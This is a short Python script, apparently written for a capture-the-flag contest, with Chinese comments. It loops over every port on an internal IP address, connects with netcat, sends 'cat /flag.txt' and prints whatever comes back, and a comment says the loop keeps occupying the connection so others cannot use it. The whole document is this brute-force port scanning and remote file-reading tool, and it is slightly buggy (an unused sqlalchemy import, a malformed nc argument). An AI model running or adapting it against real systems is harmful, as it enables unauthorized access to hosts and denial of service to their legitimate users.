# -*- coding: utf-8 -*
#只允许在Linux环境中运行
import pexpect

from sqlalchemy import true

while True:                            #可一直循环占坑，防止其他人连接
    host='192.168.132.38'             #输入自己的ip地址
    for j in range(0,65535):         ##爆破端口
        j=str(j)
        a = pexpect.spawn("nc %s %s:"%(host,j))
        a.setecho(False)
        a.sendline('cat /flag.txt')
        a.sendline('exit')
        flag=a.read()
        if flag=='Connection refused':
            pass
        else:
            print(host+':'+flag)
            break